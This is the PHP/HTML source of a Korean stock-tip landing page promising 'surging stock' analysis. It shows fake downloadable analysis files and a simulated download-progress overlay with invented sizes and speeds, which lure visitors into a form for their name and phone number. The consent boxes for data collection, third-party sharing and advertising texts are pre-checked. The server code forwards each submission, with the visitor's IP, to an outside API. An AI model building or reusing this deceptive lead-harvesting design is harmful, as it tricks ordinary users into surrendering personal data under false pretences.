<?php
// 오류 방지 및 헤더 설정
error_reporting(E_ALL & ~E_NOTICE & ~E_WARNING);
header('Content-Type: text/html; charset=UTF-8');

// POST 데이터 전송 시 API 호출
if (isset($_POST["Update_type"]) && $_POST["Update_type"] === "Update_now") {
    $name = isset($_POST["name"]) ? strip_tags($_POST["name"]) : "";
    $tel  = isset($_POST["tel"]) ? strip_tags($_POST["tel"]) : "";

    $SEND_DATA_ary = array();
    $SEND_DATA_ary["ITEM"]    = "20";
    $SEND_DATA_ary["DBname"]  = $name;
    $SEND_DATA_ary["DBphone"] = $tel;
    $SEND_DATA_ary["DBfild1"] = isset($_POST["option1"]) ? strip_tags($_POST["option1"]) : "";
    $SEND_DATA_ary["DBfild2"] = isset($_POST["option2"]) ? strip_tags($_POST["option2"]) : "";
    $SEND_DATA_ary["DBfild3"] = isset($_POST["time"]) ? strip_tags($_POST["time"]) : "";
    $SEND_DATA_ary["DBip"]    = $_SERVER["REMOTE_ADDR"];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "http://anonymus.kr/api/");
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $SEND_DATA_ary);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    curl_exec($ch);
    curl_close($ch);
?>
    <script>
    location.href = "success.html";
    </script>
<?php
    exit;
}
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta name="viewport" content="width=640, user-scalable=no">
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>실시간 종목현황</title>

<link href="css/default.css?ver=6" rel="stylesheet" />
<link href="css/default_m.css?ver=6" rel="stylesheet" />
<link rel="stylesheet" type="text/css" href="css/slick.css"/>
<link rel="stylesheet" type="text/css" href="css/slick-theme.css" >

<!-- jQuery 라이브러리를 최상단으로 이동 -->
<script src="js/jquery-1.11.0.min.js"></script>
<script src="js/jquery-ui.min.js"></script>
<script src="js/jquery.bpopup.min.js"></script>
<script type="text/javascript" src="js/slick.min.js"></script>
<script src="js/default.js"></script>
</head>

<body>
<!-- 비디오 BG -->
<div class="parent-element-to-video">
    <video loop muted autoplay class="fullscreen-bg__video">
        <source src="images/motion_bg.mp4" type="video/mp4">
    </video>
</div>

<!-- 전체박스 -->
<div class="main_container">

    <!-- 800px 컨텐츠 박스 -->
    <div class="content_box">
        <div class="main_top">
            <img src="images/main_top.png">
        </div>
        <div class="main_top_text">
            실시간 종목현황 <span>급등 종목</span> 받기
        </div>
        <div class="main_file_box" style="position:relative; z-index:5;">
            <div class="file_list">
                <div class="file_text" onclick="layer_1_open('layer_1');">
                    <span class="img"><img src="images/icon_zip.png"></span>
                    <span class="text">글로벌코리아빅엔터테인먼트코리아_11월3일_분석자료.zip</span>
                    <span class="dimg"><img src="images/icon_down.png"></span>
                </div>
            </div>
            <div class="height_empty"></div>
            <div class="file_list">
                <div class="file_text" onclick="layer_1_open('layer_1');">
                    <span class="img"><img src="images/icon_egg.png"></span>
                    <span class="text">10월_급등주_스익률_현황.EGG</span>
                    <span class="dimg"><img src="images/icon_down.png"></span>
                </div>
            </div>
        </div>

        <div class="main_mid_text">
            실시간 <span>시황분석알림</span>은 필수
        </div>

        <div class="main_news_box" style="padding:0px 30px; z-index:2;">
            <div id="slider-div" style="display:inline-block;">     
                <div class="news_list" onclick="layer_1_open('layer_1');">
                    <span class="news_content">
                        <p class="title">1월 3일 헤븐의 장전 브리핑</p>
                        <p class="info">코로나 재확산 관련 피해 입송이 부진해 다우 지수는 하락하는 등 혼자마감</p>
                    </span>
                    <span class="news_more">+</span>                
                </div>
                <div class="news_list" onclick="layer_1_open('layer_1');">
                    <span class="news_content">
                        <p class="title">1월 2일 헤븐의 장전 브리핑</p>
                        <p class="info">코로나 재확산 관련 피해 입송이 부진해 다우 지수는 하락하는 등 혼자마감</p>
                    </span>
                    <span class="news_more">+</span>                
                </div>
                <div class="news_list" onclick="layer_1_open('layer_1');">
                    <span class="news_content">
                        <p class="title">1월 1일 헤븐의 장전 브리핑</p>
                        <p class="info">코로나 재확산 관련 피해 입송이 부진해 다우 지수는 하락하는 등 혼자마감</p>
                    </span>
                    <span class="news_more">+</span>                
                </div>
                <div class="news_list" onclick="layer_1_open('layer_1');">
                    <span class="news_content">
                        <p class="title">2월 15일 헤븐의 장전 브리핑</p>
                        <p class="info">코로나 재확산 관련 피해 입송이 부진해 다우 지수는 하락하는 등 혼자마감</p>
                    </span>
                    <span class="news_more">+</span>                
                </div>
                <div class="news_list" onclick="layer_1_open('layer_1');">
                    <span class="news_content">
                        <p class="title">3월 10일 헤븐의 장전 브리핑</p>
                        <p class="info">코로나 재확산 관련 피해 입송이 부진해 다우 지수는 하락하는 등 혼자마감</p>
                    </span>
                    <span class="news_more">+</span>                
                </div>
            </div>
        </div>
    </div>
    <!-- //800px 컨텐츠 박스 -->

    <!-- layer1 -->
    <div class="layer_box" id="layer_1" style="display:none;">
        <input type="hidden" value="0" id="down_chk">
        <div><img src="images/download_top.jpg" class="down_top" onclick="down_loading(1);"></div>
        <div class="down_box">
            <div class="bar_box">
                <span class="title">전체전송</span>
                <span><img src="images/down_bar_1.jpg" id="down_bar"></span>
            </div>
            
            <div class="speed_box">
                <ul>
                    <li class="li_1">전체파일</li>
                    <li class="li_2"><span id="file_cnt">0/2</span></li>
                    <li class="li_1">전송속도</li>
                    <li class="li_2"><span id="file_speed">11.2MB</span></li>
                </ul>
                <ul>
                    <li class="li_1">저장위치</li>
                    <li class="li_2">C:\Program Files\Download</li>
                    <li class="li_1">서버상태</li>
                    <li class="li_2 state">
                        <span class="state_text">-</span>
                        <span class="state_btn"><img src="images/downfolder_open.jpg"></span>
                    </li>
                </ul>
            </div>

            <div class="downlist_box">
                <img src="images/download_title.jpg">
                <ul class="hol on">
                    <li class="filename">
                        <span class="icon"><img src="images/icon_zip.png"></span>
                        <span>삼성전자_11월_분석자료.zip</span>
                    </li>
                    <li class="filesize"><span id="file01_down">1.3MB</span>/6.3MB</li>
                    <li class="filestate">ON</li>
                </ul>
                <ul class="jjak">
                    <li class="filename">
                        <span class="icon"><img src="images/icon_egg.png"></span>
                        <span>삼성전자_10월_분석자료.zip</span>
                    </li>
                    <li class="filesize"><span id="file02_down">1.3MB</span>/5MB</li>
                    <li class="filestate">ON</li>
                </ul>
            </div>
        </div>
        <div onclick="openPopup('layer_2');" class="down_bot"><img src="images/download_bot.jpg"></div>
    </div>
    <!-- //layer1 -->

    <!-- layer2 (Form 태그 및 name 속성 추가 완료) -->
    <div class="layer_box2" id="layer_2" style="display:none;">
        <div class="content_box">       
            <div class="top_container">
                <span class="logo"><img src="images/layer2_logo.png"></span>        
                <span class="btn"><img src="images/close_btn.png" width="30" onclick="closePopup();"></span>
            </div>
            
            <p class="content_title">실시간 <span>급등 종목 분석</span> 받기</p>
            <p class="sub_title">* 해당 정보를 입력하시면 분석된 종목을 제공해드립니다.</p>
        
            <form id="apply_form" method="post" action="">
                <input type="hidden" name="Update_type" value="Update_now">
                <div class="input_box">
                    <ul>
                        <li class="input_name">
                            <input type="text" name="name" id="user_name" placeholder="* 이름을 입력해주세요">
                        </li>
                    </ul>
                    <ul>
                        <li class="input_name">
                            <input type="text" name="tel" id="user_tel" placeholder="전화번호를 입력해주세요(숫자만)">
                        </li>
                    </ul>
                </div>
                <div class="agree_box">
                    <p><label class="checkbox-wrap"><input type="checkbox" name="agree1" id="agree1" checked><i class="check-icon"></i> 개인정보 수집 및 활용동의(필수)</label> <b>[보기]</b></p>
                    <p><label class="checkbox-wrap"><input type="checkbox" name="agree2" id="agree2" checked><i class="check-icon"></i> 개인정보 제3자 제공동의(필수)</label> <b>[보기]</b></p>
                    <p><label class="checkbox-wrap"><input type="checkbox" name="agree3" checked><i class="check-icon"></i> 광고성 문자메세지 수신동의</label></p>
                </div>

                <div class="btn_box">
                    <img src="images/layer2_btn.png" onclick="submitForm();" style="cursor:pointer;">
                </div>
            </form>
        </div>
    </div>
    <!-- //layer2 -->

    <!-- 동전 BG -->
    <div class="money_bg"><img src="images/money_bg.png" width="100%"></div>

    <!-- 푸터 -->
    <div class="foot_container">
        <div class="footer">
            <p>회사명:(주) 헤븐컴퍼니 | 대표자:천지훈 | 주소:서울특별시 강남구 도산대로 540, 8층</p>
            <p>사업자등록번호:756-86-01111 | 개인정보관리자:김태용</p>
            <p>대표번호 : 1644-9177</p>
            <p>이메일 : investment@heaven2011.co.kr</p>
            <p><b>COPYRIGHT @ GOSUECOTV All Rights Reserved.</b></p>
        </div>
    </div>
</div>

<script>
// 1. 팝업 제어 및 폼 전송 함수
function layer_1_open(id) {
    $('#' + id).show();
}

function openPopup(id) {
    $('#layer_1').hide();
    $('#' + id).show();
}

function closePopup() {
    $('#layer_1, #layer_2').hide();
}

function down_loading(step) {
    alert("다운로드를 준비 중입니다.");
}

function submitForm() {
    var name = $.trim($('#user_name').val());
    var tel = $.trim($('#user_tel').val());

    if (!name) {
        alert("이름을 입력해주세요.");
        $('#user_name').focus();
        return false;
    }
    if (!tel) {
        alert("전화번호를 입력해주세요.");
        $('#user_tel').focus();
        return false;
    }
    if (!$('#agree1').is(':checked') || !$('#agree2').is(':checked')) {
        alert("필수 약관에 동의해주세요.");
        return false;
    }

    $('#apply_form').submit();
}

// 2. 슬라이더 및 이벤트 연결
$(function(){
    $('#slider-div').slick({
        arrows: false,
        slide: 'div',
        zIndex: 10,
        infinite: true,
        slidesToShow: 3,
        slidesToScroll: 1,
        speed: 1000,
        autoplay: true,
        autoplaySpeed: 2000,
        pauseOnHover: false,
        vertical: true,
        verticalSwiping: true,
        waitForAnimate: false,
        draggable: true
    });
});

$(document).ready(function() {
    $('.file_list').hover(function(){
        $(this).addClass("file_list_on");
        $(this).find(".dimg > img").attr("src", "images/icon_down_on.png");
    }, function () {
        $(this).removeClass("file_list_on");
        $(this).find(".dimg > img").attr("src", "images/icon_down.png");
    });

    // 선택자 오타 수정: $('file_list') -> $('.file_list')
    $('.file_list').click(function(){
        $(this).addClass("file_list_on");
        $(this).find(".dimg > img").attr("src", "images/icon_down_on.png");
    });
});
</script>
</body>
</html>